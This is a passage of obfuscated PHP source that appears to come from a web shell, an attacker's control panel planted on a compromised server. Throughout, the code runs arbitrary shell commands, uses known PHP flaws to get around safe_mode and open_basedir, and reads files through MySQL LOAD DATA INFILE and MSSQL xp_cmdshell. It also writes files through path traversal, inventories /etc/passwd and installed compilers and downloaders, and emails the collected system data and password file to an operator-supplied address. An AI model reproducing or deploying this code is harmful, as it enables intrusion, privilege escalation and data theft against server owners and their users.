        echo z2b(z9s("78") . z9c() . ($use_images ? '<img src="?act=i&amp;img=' . $ext . '"> ' : '') . z4p($d . $f . " (" . z7c(@filesize($d . $f)) . ")") . (@isset($rcmsg) ? $rcmsg : ''));
        z2j();
        if (($ft != 'functions' || ($ft == 'functions' && @isset($submit_encode))) && $ft != 'ini') {
            $r = z9p($d . $f);
        }
        switch ($ft) {
        case 'functions':
            echo z2b(z9s("90"));
            echo z6d();
            $encode_functions = z0x();
            echo z9m('2') . z9l() . z9b("d") . z9b("act", "f") . z9b("f") . z9b("ft", "functions") . z9b("submit_encode", "1") . z7i(z5t(z9s("91")) . z9j(z4a("encode_selected", $encode_functions, "0", 1, '9') . z8v(z9s("92"), '7'))) . z9z();
            $encoder_output = "";
            if (@isset($submit_encode) && $submit_encode) {
                $encoder_output = $encode_selected($r);
                echo z9f(z5t(z9s("102")) . z9j(z5w('', '1') . @htmlspecialchars($encoder_output) . z5q()));
            }
            echo z10w();
            echo z6d();
            z1q($d . $f);
            if (z7r('touch')) {
                z2v();
                echo z2b(z9s("103"));
                echo z10e(z5n() . (@isset($tmsg) && !@empty($tmsg) ? z7i(z5t(z9c()) . z9j($tmsg)) : '') . z7i(z5c(array("act", "d", "f", "ft" => "functions", "st1" => "1"), z5t(z9s("104")) . z9j(z5u("copy_from", "", "9") . z8v(z9s("112"), "7")))) . z7i(z5c(array("act", "d", "f", "ft" => "functions", "st2" => "1"), z5t(z9s("105")) . z9j(z4a("tmonth", $tmonth_arr, "4", 1) . "-" . z4a("tday", $tday_arr, "4", 1) . "-" . z4a("tyear", $tyear_arr, "4", 1) . z9c(12) . z4a("thour", $thour_arr, "1", 1) . ":" . z4a("tmin", $tmin_arr, "1", 1) . ":" . z4a("tsec", $tsec_arr, "1", 1) . z8v(z9s("112"), "7")))) . z5n(), "2");
            }
            break;
        case 'edit':
            $msg = "";
            if (@isset($save) && $save) {
                $msg = (z9y($d . $f, $txtedit) ? z9s("243") : z9s("450"));
                $r = z9p($d . $f);
            }
            echo z5c(array("act" => "f", "d", "f", "ft" => "edit", "save" => "1"), z10e(z9f(z6x(z5w('txtedit', '2') . @htmlspecialchars($r) . z5q() . z9x() . z5x("left", "3") . z8e(z9s("115")) . '<input type="text" id="replace_a" class="' . z4m('5', '4') . '">' . z9c(5) . z8e(z9s("116")) . '<input type="text" id="replace_b" class="' . z4m('5', '4') . '">' . z8m(z9s("117"), 'fnc_replace(\'txtedit\',\'replace_a\',\'replace_b\');', "7") . '<input type="reset" value="' . z9s("118") . '" class="' . z4m('7', '5') . '">' . z8v(z9s("119"), "7") . z9c() . z8e($msg) . z5j())), "2"));
            echo z6d();
            break;
        case 'text':
            echo z10e(z9f(z6x('<pre>' . @htmlspecialchars($r) . '</pre>')), '2');
            break;
        case 'web':
            $url = z8o();
            $url_a = @parse_url($url);
            if (@isset($url_a["host"])) {
                $host = $url_a["host"];
                if (($wwwdir = z3k()) !== false) {
                    if (@strstr($d . $f, $wwwdir) !== false) {
                        $link = "http://" . $host . "/" . @substr($d . $f, @strlen($wwwdir));
                        echo z10e(z9f(z6x('<iframe border="0" class="iframe" src="' . $link . '">' . z9s("471") . '</iframe>')) . z5n(), '2');
                    }
                }
            }
            break;
        case 'html':
            if (@isset($white) && $white) {
                @ob_clean();
                echo $r;
                @exit();
            } else {
                echo z10e(z9f(z6x('<iframe border="0" class="iframe" src="?act=f&amp;f=' . @urlencode($f) . '&amp;d=' . @urlencode($d) . '&white=1&ft=html">' . z9s("471") . '</iframe>')) . z5n(), '2');
            }
            break;
        case 'htmls':
            if (@isset($white) && $white) {
                $r = @preg_replace('#\b(on(?<!\.on)[a-z]{2,20})\s*=\s*([\\\'"])?((?(2)(?(?<=")[^"]{1,1000}|[^\\\']{1,1000})|[^\s"\\\'>]{1,1000}))(?(2)\\2|)#i', '', $r);
                $r = @preg_replace('#(<script[^>]*>.*?</script>|<[/]*noscript>|<meta\s(.*?)>)#is', '', $r);
                $r = @preg_replace('#\b(href(?<!\.))\s*=\s*([\\\'"])?javascript:#i', 'href=\\2#javascript:', $r);
                @ob_clean();
                echo $r;
                @exit();
            } else {
                echo z10e(z9f(z6x('<iframe border="0" class="iframe" src="?act=f&amp;f=' . @urlencode($f) . '&amp;d=' . @urlencode($d) . '&white=1&ft=htmls">' . z9s("471") . '</iframe>')) . z5n(), '2');
            }
            break;
        case 'code':
            echo z6z('', '2') . z7p() . z6w();
            z1x($r, $ext);
            echo z7g() . z7u() . z10w();
            break;
        case 'exe':
            if (!@isset($ecmd)) {
                $ext = z2h($f, '.');
                $ecmd = $d . $f;
                foreach ($execaliases as $ek => $ev) {
                    if (@in_array(@strtolower($ext), $ev)) {
                        $ecmd = @str_replace("%f%", $ecmd, $ek);
                        break;
                    }
                }
            }
            echo z5c(array("act" => "f", "ft" => "exe", "d", "f", "exec" => "1"), z10e(z5n() . z7i(z6x(z8e(z9s("120")) . z5u('ecmd', '', "9") . z8v(z9s("99"), "7"))) . z5n(), "2"));
            if (@isset($exec) && $exec && !@empty($ecmd)) {
                echo z9m("2") . z6g() . z6w() . z5w('', "1");
                $res = z9t($ecmd);
                echo $res;
                echo z5q() . z7g() . z7u() . z5n() . z10w();
            }
            break;
        case 'sess':
            echo z6z('', '2') . z7p() . z6w() . '<pre>';
            $e = @explode('|', $r);
            echo $e[0] . z9x();
            @var_dump(@unserialize($e[1]));
            echo '</pre>';
            echo '</pre>' . z7g() . z7u() . z10w();
            break;
        case 'ini':
            echo z6z('', '2') . z7p() . z6w() . '<pre>';
            @var_dump(@parse_ini_file($d . $f, true));
            echo '</pre>' . z7g() . z7u() . z10w();
            break;
        case 'sdb':
            echo z6z('', '2') . z7p() . z6w() . '<pre>';
            @var_dump(@unserialize(@base64_decode($r)));
            echo '</pre>' . z7g() . z7u() . z10w();
            break;
        case 'img':
            if (!@isset($is)) {
                $is = 50;
            }

            $inf = @getimagesize($d . $f);
            if (@isset($inf[0]) && @isset($inf[1]) && @isset($inf['mime'])) {
                $w = $inf[0] / 100 * $is;
                $h = $inf[1] / 100 * $is;
                $mime = $inf["mime"];
            } else {
                $w = $h = $t = '';
                if (@preg_match('/(jpg|jpeg|gif|png)/i', $r, $m)) {
                    $t = ($m[1] === 'jpeg') ? 'jpg' : $m[1];
                }

                $mime = 'image/' . @strtolower($t);
            }
            if (!@isset($white) || !$white) {
                echo z5x("center") . z9x();
                if ($w != '') {
                    foreach (array('20', '50', '100', '150', '200') as $v) {
                        echo z5c(array('act' => 'f', 'd', 'f', 'ft' => 'img', 'is' => $v), z8v($v . '%', ($is == $v ? '17' : '16')));
                    }
                }
                echo z9x(2) . '<img alt="" src="?act=f&amp;f=' . @urlencode($f) . '&amp;ft=img&amp;white=1&amp;d=' . @urlencode($d) . '"' . ($w != '' ? ' width="' . $w . '"' : '') . ($h != '' ? ' height="' . $h . '"' : '') . ' border="0" style="border: 1px solid #DDDDDD;">' . z5j() . z9x(2);
            } else {
                @ob_clean();
                @header("Content-type: " . $mime);
                echo $r;
                exit();
            }
            break;
        case 'hex':
            if (!@isset($hexdump_type)) {
                $hexdump_type = '';
            }
            if ($hexdump_type == "full") {
                $str = $r;
            } else {
                $str = @substr($r, 0, 16 * 24);
            }
            $n = 0;
            $a0 = $a1 = $a2 = '';
            $ofs = 0;
            $len = @strlen($str);
            for ($i = 0; $i < $len; $i++) {
                $a1 .= @sprintf('%02X', @ord($str[$i])) . z9c();
                if (@ord($str[$i]) == 0) {
                    $a2 .= z5i("0");
                } elseif (@ord($str[$i]) >= 0x20 && @ord($str[$i]) <= 0x7E) {
                    $a2 .= @htmlspecialchars($str[$i]);
                } else {
                    $a2 .= ".";
                }
                $n++;
                if ($n == 24 || ($i + 1 == $len && !@is_int($len / 24))) {
                    $n = 0;
                    $a0 .= @sprintf('%08X', $ofs) . z9x();
                    $a1 .= z9x();
                    $a2 .= z9x();
                    $ofs += 24;
                }
            }
            echo z10e(z9f(z6x(z10e(z7i(z9j($a0, '16') . z9j($a1, '17') . z9j($a2, '18')), '8') . z10e(z9f(z7e(z5c(array('act' => 'f', 'd', 'f', 'ft', 'hexdump_type' => ($hexdump_type == 'full' ? 'preview' : 'full')), z8v(($hexdump_type == 'full' ? z9s("122") : z9s("121")), '7')))), '8'))), '2');
            break;
        case 'download':
            @ob_clean();
            @header("Content-type: application/octet-stream");
            @header("Content-disposition: attachment; filename=\"" . $f . "\";");
            echo $r;
            exit();
            break;
        default:
            break;
        }
    } else {
        if (!@isset($loadb)) {
            $loadb = 0;
        }

        $rbut = z5c($back_form_actions, z8v(z9s("470"), "7"));
        if (@empty($f)) {
            echo z2b(z9s("469") . $fmsg . z9c(5) . $rbut);
        } else {
            switch ($ft) {
            case 'new':
                if (!z4q($d . $f) && z4j($d) && !z0v($d)) {
                    $loadb = 1;
                } elseif (!z4q($d . $f)) {
                    $loadb = 1;
                } elseif (z4q($d . $f) && z4j($d . $f)) {
                    echo z2b(z9s("468", $d . $f) . z9c(5) . $rbut);
                } elseif (z4q($f) && z4j($f)) {
                    echo z2b(z9s("468", $f) . z9c(5) . $rbut);
                }
                break;
            default:
                if (z4q($d . $f) && z4j($d . $f)) {
                    echo z2b(z9s("468", $d . $f) . z9c(5) . $rbut);
                } elseif (z4q($f) && z4j($f)) {
                    echo z2b(z9s("468", $f) . z9c(5) . $rbut);
                } elseif (!z4q($d . $f) && z4j($d) && z0v($d) && @strpos($f, "/") === false) {
                    echo z2b(z10e(z7i(z9j(z8e(z9s("466", $d . $f)) . z5c(array("act" => "f", "d", "f", "ft" => "new"), z8v(z9s("195"), "7")) . $rbut)), "2"));
                } else {
                    $loadb = 1;
                }
                break;
            }
        }
        if ($loadb) {
            z1q($d . $f);
            $rf_arr = $sqlrf_arr = $wf_arr = array();
            $rf_arr["include"] = "include (safe_mode)";
            if ($bcurl && @version_compare(@phpversion(), "5.2.0") <= 0) {
                $rf_arr["curl"] = "curl (open_basedir / PHP <= 4.4.2, 5.1.4)";
            }
            if (!$win && z7r('mb_send_mail') && @version_compare(@phpversion(), "5.2.0") <= 0) {
                $rf_arr["mb_send_mail"] = "mb_send_mail (safe_mode / PHP <= 4.0-4.2.2, 5.x)";
            }
            if (z7r('imap_open') && z7r('imap_body') && @version_compare(@phpversion(), "5.2.0") <= 0) {
                $rf_arr["imap_body"] = "imap_body (safe_mode on PHP <= 5.1.2)";
            }
            if (z7r('ini_restore') && @version_compare(@phpversion(), "5.2.0") <= 0) {
                $rf_arr["ini_restore"] = "ini_restore (safe_mode / PHP <= 4.4.4, 5.1.6) by NST";
            }
            if (z7r('copy') && @version_compare(@phpversion(), "5.2.0") <= 0) {
                $rf_arr["zlib"] = "copy[compress.zlib://] (safe_mode / PHP <= 4.4.2, 5.1.2)";
            }
            if ($bmysql) {
                $sqlrf_arr["mysql"] = "mysql (safe_mode)";
            }
            if ($bmssql) {
                $sqlrf_arr["mssql"] = "mssql (safe_mode)";
            }
            if (z7r('error_log') && @version_compare(@phpversion(), "5.2.2") <= 0) {
                $wf_arr["error_log"] = "error_log[php://] (open_basedir / PHP <= 5.1.4, 4.4.2)";
            }
            if (z7r('readfile') && @version_compare(@phpversion(), "5.2.2") <= 0) {
                $wf_arr["readfile"] = "readfile[php://] (open_basedir / PHP <= 5.2.1, 4.4.4)";
            }
            if (@version_compare(@phpversion(), "5.2.4") <= 0) {
                $wf_arr["fopen"] = "fopen[srpath://] (open_basedir / PHP v5.2.0)";
            }
            if (@count($rf_arr) > 0) {
                echo z2b(z9s("128"));
                echo z6d();
                echo z5c(array("act" => "f", "d", "f" => (@isset($readfile) ? $readfile : $d . $f), "ft" => "functions", "submit1" => "1"), z10e(z7i(z5t(z9s("129")) . z9j(z6i("readfile", (@isset($readfile) ? $readfile : $d . $f), "0", "", "9") . z4a("readfile_func", $rf_arr, "5", 1) . z8v(z9s("130"), "7"))), "2"));
                if (@isset($submit1) && $submit1 && @isset($readfile) && !@empty($readfile)) {
                    echo z9m("2") . z7p() . z5t(z9c()) . z7k();
                    switch ($readfile_func) {
                    case 'include':
                        echo z5w('', '1');
                        @include $readfile;
                        echo z5q();
                        break;
                    case 'curl':
                        echo z5w('', '1');
                        $ci = @curl_init("file://" . $readfile);
                        $cf = @curl_exec($ci);
                        echo @htmlspecialchars($cf);
                        echo z5q();
                        break;
                    case 'mb_send_mail':
                        echo z5w('', '1');
                        $temp = tempnam($d, "fname");
                        if (@file_exists($temp)) {
                            @unlink($temp);
                        }

                        $extra = "-C " . $readfile . " -X $temp";
                        @mb_send_mail(NULL, NULL, NULL, NULL, $extra);
                        $str = z9p($temp);
                        echo @htmlspecialchars($str);
                        echo z5q();
                        @unlink($temp);
                        break;
                    case 'imap_body':
                        echo z5w('', '1');
                        $stream = @imap_open($readfile, "", "");
                        $str = @imap_body($stream, 1);
                        echo @htmlspecialchars($str);
                        @imap_close($stream);
                        echo z5q();
                        break;
                    case 'ini_restore':
                        @ini_restore("safe_mode");
                        @ini_restore("open_basedir");
                        $str = z9p($readfile);
                        echo z5w('', '1') . @htmlspecialchars($str) . z5q();
                        break;
                    case 'zlib':
                        $str = z9o($readfile);
                        echo z5w('', '1') . @htmlspecialchars($str) . z5q();
                        break;
                    }
                    echo z7g() . z7u() . z10w();
                }
                echo z6d();
            }
            if (@count($sqlrf_arr) > 0) {
                echo z2b(z9s("131"));
                echo z6d();
                echo z5c(array("act" => "f", "d", "f" => (@isset($readfile) ? $readfile : $d . $f), "ft" => "functions", "submit2" => "1"), z10e(z7i(z5t(z9s("129")) . z9j(z6i("readfile", (@isset($readfile) ? $readfile : $d . $f), "0", "", "9") . z4a("sqlreadfile_func", $sqlrf_arr, "5", 1) . z8v(z9s("130"), "7"))) . z7i(z5t(z9s("132")) . z9j(z5u("sqluser", "root", "4", "", "9") . z9c(2) . z8e(z9s("133")) . z5u("sqlpass", "", "4") . z9c(2) . z8e(z9s("134")) . z5u("sqlport", "3306", "1") . z9c(2) . z8e(z9s("135")) . z5u("sqldb", "mysql", "4"))), "2"));
                if (@isset($submit2) && $submit2 && @isset($readfile) && !@empty($readfile) && @isset($sqluser) && @isset($sqlpass) && @isset($sqlport) && @isset($sqldb)) {
                    echo z9m("2") . z7p() . z5t(z9c()) . z7k();
                    switch ($sqlreadfile_func) {
                    case 'mysql':
                        echo z5w('', '1');
                        if (@empty($sqlport)) {
                            $sqlport = "3306";
                        }

                        $db = @mysql_connect('localhost:' . $sqlport, $sqluser, $sqlpass);
                        if ($db) {
                            if (@mysql_select_db($sqldb, $db)) {
                                @mysql_query("DROP TABLE IF EXISTS temp_mysql_readfile_table");
                                @mysql_query("CREATE TABLE `temp_mysql_readfile_table` ( `file` LONGBLOB NOT NULL )");
                                @mysql_query("LOAD DATA INFILE \"" . $readfile . "\" INTO TABLE temp_mysql_readfile_table");
                                $r = @mysql_query("SELECT * FROM temp_mysql_readfile_table");
                                while (($r_sql = @mysql_fetch_array($r)) !== false) {
                                    echo @htmlspecialchars($r_sql[0]) . "\r\n";
                                }
                                @mysql_query("DROP TABLE IF EXISTS temp_mysql_readfile_table");
                            } else {
                                echo z9s("136");
                            }
                            @mysql_close($db);
                        } else {
                            echo z9s("137", "MySQL");
                        }

                        echo z5q();
                        break;
                    case 'mssql':
                        echo z5w('', '1');
                        if (@empty($sqlport)) {
                            $sqlport = "1433";
                        }

                        $db = @mssql_connect('localhost,' . $sqlport, $sqluser, $sqlpass);
                        if ($db) {
                            if (@mssql_select_db($sqldb, $db)) {
                                @mssql_query("drop table mssql_readfile_temp_table", $db);
                                @mssql_query("create table mssql_readfile_temp_table ( string VARCHAR (500) NULL)", $db);
                                @mssql_query("insert into mssql_readfile_temp_table EXEC master.dbo.xp_cmdshell '" . $readfile . "'", $db);
                                $res = @mssql_query("select * from mssql_readfile_temp_table", $db);
                                while (($row = @mssql_fetch_row($res)) !== false) {
                                    echo @htmlspecialchars($row[0]) . "\r\n";
                                }
                                @mssql_query("drop table mssql_readfile_temp_table", $db);
                            } else {
                                echo z9s("136");
                            }
                            @mssql_close($db);
                        } else {
                            echo z9s("137", "MsSQL");
                        }

                        echo z5q();
                        break;
                    }
                    echo z7g() . z7u() . z10w();
                }
                echo z6d();
            }
            if (@count($wf_arr) > 0) {
                echo z2b(z9s("138"));
                echo z6d();
                echo z5c(array("act" => "f", "d", "f" => (@isset($writefile) ? $writefile : $d . $f), "ft" => "functions", "submit3" => "1"), z10e(z7i(z5t(z9s("139")) . z9j(z5u("writefile", $d . $f, "0", "", "9") . z4a("writefile_func", $wf_arr, "5", 1) . z8v(z9s("141"), "7"))) . z7i(z5t(z9s("140")) . z9j(z5w("writecontent", "1") . (@isset($writecontent) ? @htmlspecialchars($writecontent) : '<? phpinfo(); ?>') . z5q())), "2"));
                if (@isset($submit3) && $submit3 && @isset($writefile) && !@empty($writefile)) {
                    echo z9m("2") . z6g() . z5t(z9c()) . z7k();
                    switch ($writefile_func) {
                    case 'error_log':
                        @error_log($writecontent, 3, "php://../../../../../../../../../../../" . $writefile);
                        if (z4q($writefile)) {
                            echo z9s("243");
                        }

                        break;
                    case 'readfile':
                        @readfile($writecontent, 3, "php://../../../../../../../../../../../" . $writefile);
                        if (z4q($writefile)) {
                            echo z9s("243");
                        }

                        break;
                        break;
                    case 'fopen':
                        if ($fp = @fopen('srpath://../../../../../../../../../../../' . $writefile, "a")) {
                            @fputs($fp, $writecontent);
                            @fclose($fp);
                            echo z9s("243");
                        }
                        break;
                    default:
                        break;
                    }
                    echo z7g() . z7u() . z10w();
                }
                echo z6d();
            }
        }
    }
}
if ($act == 'search') {
    $ftarget = 1;
    $fullpath = 1;
    if (!@isset($s_in) || @empty($s_in)) {
        $s_in = $d;
    }
    if (!@isset($sn) || @empty($sn)) {
        $sn = "(.*)";
        $sn_reg = 1;
    }
    if (!@isset($sn_reg)) {
        $sn_reg = '';
    }
    if (!@isset($st)) {
        $st = '';
    }
    if (!@isset($st_reg)) {
        $st_reg = '';
    }
    if (!@isset($st_wwo)) {
        $st_wwo = '';
    }
    if (!@isset($st_cs)) {
        $st_cs = '';
    }
    if (!@isset($st_not)) {
        $st_not = '';
    }
    if (!@isset($s_fd)) {
        $s_fd = '';
    }
    if (!@isset($s_rec)) {
        $s_rec = '1';
    }
    if (!@isset($find_text) || @empty($find_text)) {
        $find_text = "text";
    }
    if (!@isset($find_in_dir) || @empty($find_in_dir)) {
        $find_in_dir = $d;
    }
    if (!@isset($find_in_files) || @empty($find_in_files)) {
        $find_in_files = "*.php;*.txt";
    }

    z0d();
    if (@isset($submit) && $submit) {
        $found = array();
        $found_d = 0;
        $found_f = 0;
        $search_i_f = 0;
        $search_i_d = 0;
        $ar = array("sn" => $sn, "sn_reg" => $sn_reg, "st" => $st, "st_reg" => $st_reg, "st_wwo" => $st_wwo, "st_cs" => $st_cs, "st_not" => $st_not, "s_fd" => $s_fd);
        $in = @array_unique(@explode(";", $s_in));
        foreach ($in as $v) {
            $sdir = $v;
            z5f($v);
        }
        if (@count($found) == 0) {
            echo z2b(z9s("160"));
        } else {
            $nolsmenu = 1;
            $nohead = 1;
            $ls_a = $found;
            $act = "ls";
        }
    }
}
if ($act == 'cmd') {
    $st_a = array('' => '-', ' 2>&1' => '2>&1');
    echo z2b(z10e(z7i(z6x(z8e(z9s("180")) . z9l('', 'command') . z3e(array('act' => 'cmd', 'd', 'cmdsubmit' => '1')) . z6i('cmd', '', '0') . ($nix ? z4a('stderr', $st_a, '1', '1') : '') . z8v('&raquo;', '7') . z9z(), '', '2') . z6x(z8e(z9s("181")) . z5c(array('act' => 'cmd', 'd', 'cmdsubmit' => '1'), z2u('scmd', ($win ? $winaliases : $nixaliases), '0', '1') . ($nix ? z4a('stderr', $st_a, '1', '1') : '') . z8v('&raquo;', '7')), '')), '2'));
    echo z9m('2') . z6g() . z6w() . z5w('', '0', 1);
    if (@isset($cmdsubmit) && $cmdsubmit) {
        echo z9t((@isset($cmd) ? (@isset($stderr) ? $cmd . $stderr : $cmd) : (@isset($stderr) ? $scmd . $stderr : $scmd)));
    }
    echo z5q() . z7g() . z7u() . z10w();
}
if ($act == 'phpinfo') {
    $piarr = z0b(1);
    $h = 0;
    foreach ($piarr as $k => $v) {
        echo z2b(@strtoupper($k));
        echo z9m('2');
        $i = 0;
        foreach ($v as $a => $b) {
            if (@is_string($b)) {
                echo z9f(z9j($a, '14', '25') . z9j($b, '14'), ($i % 2 ? '0' : '1'));
                $i++;
            }
        }
        $h++;
        echo z10w();
    }
}
if ($act == 'sysinfo') {
    $g_arr = array();
    $date = @date("D M j G:i:s T Y");
    $users = array();
    if ($bpasswd) {
        $users = z6m(1);
    }

    $distro = z1n();
    $uptime = ($nix && $sh_exec) ? z9t("uptime") : '';
    $system = $host = $kernel = "";
    $sys = (($nix && $sh_exec) ? z9t("uname -a") : (z7r('php_uname') ? @php_uname("a") : '   '));
    if ($nix) {
        @list($system, $host, $kernel) = @explode(" ", $sys);
    }
    if (!@empty($sys)) {
        $g_arr[] = array("System", $sys, $sys);
    }
    if (!@empty($system) && !@empty($kernel)) {
        $g_arr[] = array((($linux) ? "Kernel" : "Version"), $system . " " . $kernel, $system . " " . $kernel);
    }
    if (!@empty($distro)) {
        $g_arr[] = array("Distro name", $distro, nl2br($distro));
    }

    $idu = "";
    if ($nix && $sh_exec) {
        $idu = z9t("id");
        $eid = @explode(" ", $idu);
        if (@count($eid) >= 2) {
            $idu = $eid[0] . " " . $eid[1];
        }
    }
    if (!@empty($idu)) {
        $g_arr[] = array("User id", $idu, $idu);
    }
    if (!@empty($uptime)) {
        $g_arr[] = array("Uptime", $uptime, $uptime);
    }
    if (!@empty($date)) {
        $g_arr[] = array("Local time", $date, $date);
    }

    $g_arr[] = array("CPU info", z3f(), z3f());
    $mem = z5a();
    $g_arr[] = array("RAM info", $mem[0][1], $mem[0][0] . $mem[0][1]);
    if ($nix) {
        $g_arr[] = array("RAM buffered", $mem[1][1], $mem[1][0] . $mem[1][1]);
    }
    if ($nix) {
        $g_arr[] = array("Swap", $mem[2][1], $mem[2][0] . $mem[2][1]);
    }

    $disk = z9e();
    if (@count($disk) > 1 || !@isset($disk[0][0])) {
        foreach ($disk as $dd => $inf) {
            $g_arr[] = array("Space on " . $dd, $inf[1], $inf[0] . $inf[1]);
        }
    } else {
        $g_arr[] = array("Disk space", $disk[0][1], $disk[0][0] . $disk[0][1]);
    }
    if (!@empty($host)) {
        $host .= " (" . @gethostbyname($host) . ") ";
    }
    if (@preg_match('/^\d\.\d\.\d\.\d$/', $saddr)) {
        $host .= $saddr;
    } else {
        $host .= $saddr . " (" . @gethostbyname($saddr) . ")";
    }
    $g_arr[] = array("Hostname", $host, $host);
    if (@count($users) > 0) {
        if (@isset($viewusers) && $viewusers) {
            $pusers = '';
            foreach ($users as $uarr) {
                $pusers .= z5c(array("act" => "ls", "d" => $uarr[1]), z8v($uarr[0], "1"), 1) . z9c() . " ";
            }
        } else {
            $pusers = @count($users) . " users on this box." . z9c() . z5c(array("act" => "sysinfo", "d", "viewusers" => "1"), z8v("View", "1"));
        }
        $g_arr[] = array("System users", "", $pusers);
    }
    if (@count($g_arr) > 0) {
        echo z2b(z9s("479"));
        echo z9m('2');
        for ($i = 0; $i < @count($g_arr); $i++) {
            echo z9f(z9j($g_arr[$i][0], "14", "25") . z9j($g_arr[$i][2], "14", "3"), ($i % 2 ? '0' : '1'));
        }
        echo z10w();
    }
    $bsmed = z8l("safe_mode_exec_dir");
    $psmed = (($bsmed) ? @ini_get("safe_mode_exec_dir") : "NONE");
    $bsmid = z8l("safe_mode_include_dir");
    $psmid = (($bsmid) ? @ini_get("safe_mode_include_dir") : "NONE");
    $opendirs = "";
    if ($bopendir) {
        foreach (z9d(@ini_get("open_basedir")) as $od) {
            $opendirs .= z5c(array("act" => "ls", "d" => $od), z8v($od, "1"), 1) . z9c() . " ";
        }
    }
    $dfnc = z6j();
    if (@count($dfnc) > 0) {
        $ndfnc = @implode(" ", $dfnc);
        $pdfnc = "";
        foreach ($dfnc as $fnc) {
            $pdfnc .= z10y('http://php.net/manual/en/function.' . @str_replace("_", "-", $fnc) . '.php', $fnc, "1", 1) . z9c() . " ";
        }
    } else {
        $ndfnc = "NONE";
        $pdfnc = z5i("NONE");
    }
    $p_arr = array();
    $p_arr[] = array("PHP Version", @phpversion(), @phpversion() . z9c() . z5c(array("act" => "phpinfo", "d"), z8v("PHP Info", "1")));
    $p_arr[] = array("Open Basedir", (($bopendir) ? @ini_get("open_basedir") : "NONE"), (($bopendir) ? $opendirs : z5i("NONE")));
    $p_arr[] = array("Safe-mode", (($bsafe) ? "ON" : "OFF"), ($bsafe ? z8z("ON") : z5i("OFF")));
    if ($bsafe) {
        $p_arr[] = array("Safe-mode exec dir", $psmed, (($bsmed) ? z5i($psmed) : z8z($psmed)));
        $p_arr[] = array("Safe-mode include dir", $psmid, (($bsmid) ? z5i($psmid) : z8z($psmid)));
    }
    foreach (array("register_globals", "allow_url_fopen", "allow_url_include", "memory_limit", "file_uploads", "upload_tmp_dir", "upload_max_filesize", "post_max_size", "magic_quotes_gpc") as $ini) {
        $p_arr[] = array(z3r(@str_replace("_", " ", $ini)), z4r(@ini_get($ini)), z4r(@ini_get($ini)));
    }
    $p_arr[] = array("Disabled Functions", $ndfnc, $pdfnc);
    if (@count($p_arr) > 0) {
        echo z2b(z9s("480"));
        echo z9m('2');
        for ($i = 0; $i < @count($p_arr); $i++) {
            echo z9f(z9j($p_arr[$i][0], "14", "25") . z9j($p_arr[$i][2], "14", "3"), ($i % 2 ? '0' : '1'));
        }
        echo z10w();
    }
    if ($nix) {
        $o_arr = array();
        $tmp = $tmpp = '';
        foreach (array("/etc/" => array("passwd", "hosts", "modules", "fstab", "issue", "issue.net", "motd"), "/proc/" => array("cpuinfo", "meminfo", "version", "interrupts")) as $ed => $af) {
            foreach ($af as $ef) {
                if (z4q($ed . $ef) && z0n($ed . $ef)) {
                    $tmp .= $ed . $ef . " ";
                    $tmpp .= z5c(array("act" => "f", "d" => $ed, "f" => $ef, "ft" => "text"), z8v($ef, "1"), 1) . z9c() . " ";
                }
            }
        }
        if (!@empty($tmp)) {
            $o_arr[] = array(z9s("482"), $tmp, $tmpp);
        }

        $tmp = $tmpp = '';
        foreach (array("/etc/" => array("syslog.conf", "syslogd.conf", "rsyslog.conf", "resolv.conf", "httpd.conf", "apache2.conf", "apache.conf", "apache2/apache.conf", "proftpd.conf", "proftpd.conf", "inetd.conf"), "/etc/apache2/" => array("httpd.conf", "apache2.conf"), "/etc/proftpd/" => array("proftpd.conf")) as $ed => $af) {
            foreach ($af as $ef) {
                if (z4q($ed . $ef) && z0n($ed . $ef)) {
                    $tmp .= $ed . $ef . " ";
                    $tmpp .= z5c(array("act" => "f", "d" => $ed, "f" => $ef, "ft" => "text"), z8v($ef, "1"), 1) . z9c() . " ";
                }
            }
        }
        if (!@empty($tmp)) {
            $o_arr[] = array(z9s("483"), $tmp, $tmpp);
        }

        $tmp = $tmpp = '';
        foreach (array("curl", "fetch", "links", "lynx", "GET", "w3m", "wget") as $ef) {
            $ff = z8u($ef);
            if (!@empty($ff)) {
                $tmp .= $ef . " ";
                $tmpp .= z5c(array("act" => "f", "d" => z3p($ff), "f" => z2h($ff)), z8v(z2h($ef), "1"), 1) . z9c() . " ";
            }
        }
        $tmp = $tmpp = '';
        foreach (array("gcc", "cc", "c++", "g++", "nasm", "ld", "make", "cmake") as $ef) {
            $ff = z8u($ef);
            if (!@empty($ff)) {
                $tmp .= $ef . " ";
                $tmpp .= z5c(array("act" => "f", "d" => z3p($ff), "f" => z2h($ff)), z8v(z2h($ef), "1"), 1) . z9c() . " ";
            }
        }
        if (!@empty($tmp)) {
            $o_arr[] = array(z9s("484"), $tmp, $tmpp);
        }

        $tmp = $tmpp = '';
        foreach (array("perl", "python", "php", "ruby", "tcl") as $ef) {
            $ff = z8u($ef);
            if (!@empty($ff)) {
                $tmp .= $ef . " ";
                $tmpp .= z5c(array("act" => "f", "d" => z3p($ff), "f" => z2h($ff)), z8v(z2h($ef), "1"), 1) . z9c() . " ";
            }
        }
        if (!@empty($tmp)) {
            $o_arr[] = array(z9s("485"), $tmp, $tmpp);
        }
        if (@count($o_arr) > 0) {
            echo z2b(z9s("481"));
            echo z9m('2');
            for ($i = 0; $i < @count($o_arr); $i++) {
                echo z9f(z9j($o_arr[$i][0], "14", "25") . z9j($o_arr[$i][2], "14", "3"), ($i % 2 ? '0' : '1'));
            }
            echo z10w();
        }
    }
    if ($bmail) {
        $emsg = '';
        $msg = '';
        if (@isset($sendlog) && $sendlog && @isset($sysmail) && !@empty($sysmail)) {
            $line = @str_repeat("-", 100) . "\r\n";
            if (@count($g_arr) > 0) {
                $msg .= $line . z9s("479") . "\r\n" . $line;
                for ($i = 0; $i < @count($g_arr); $i++) {
                    if (!@empty($g_arr[$i][1])) {
                        $msg .= $g_arr[$i][0] . " : " . $g_arr[$i][1] . "\r\n";
                    }
                }
            }
            if (@count($p_arr) > 0) {
                $msg .= $line . z9s("480") . "\n" . $line;
                for ($i = 0; $i < @count($p_arr); $i++) {
                    if (!@empty($p_arr[$i][1])) {
                        $msg .= $p_arr[$i][0] . " : " . $p_arr[$i][1] . "\r\n";
                    }
                }
            }
            if (@count($o_arr) > 0) {
                $msg .= $line . z9s("481") . "\n" . $line;
                for ($i = 0; $i < @count($o_arr); $i++) {
                    if (!@empty($o_arr[$i][1])) {
                        $msg .= $o_arr[$i][0] . " : " . $o_arr[$i][1] . "\r\n";
                    }
                }
            }
            $msg .= $line;
            if ($bpasswd) {
                $msg .= "/etc/passwd\n" . $line . z9p("/etc/passwd") . $line;
            }

            $emsg = (@mail($sysmail, "SYSINFO|$saddr", $msg) ? z9s("243") : z9s("244"));
        }
